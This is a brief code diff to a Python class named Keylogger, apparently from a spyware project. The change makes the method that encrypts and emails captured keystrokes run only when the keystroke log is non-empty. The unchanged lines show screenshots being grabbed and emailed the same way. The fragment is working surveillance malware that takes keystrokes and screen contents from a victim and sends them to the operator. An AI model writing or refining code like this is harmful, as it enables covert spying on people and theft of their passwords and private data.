@@ -54,8 +54,9 @@ class Keylogger:
             server.quit()
 
     def send_keys(self):
-        self.log = "\n\n" + self.log
-        self.send_email(self.encrypt_log())
+        if self.log:
+            self.log = "\n\n" + self.log
+            self.send_email(self.encrypt_log())
 
     def send_screenshot(self):
         self.send_email(pyscreenshot.grab())
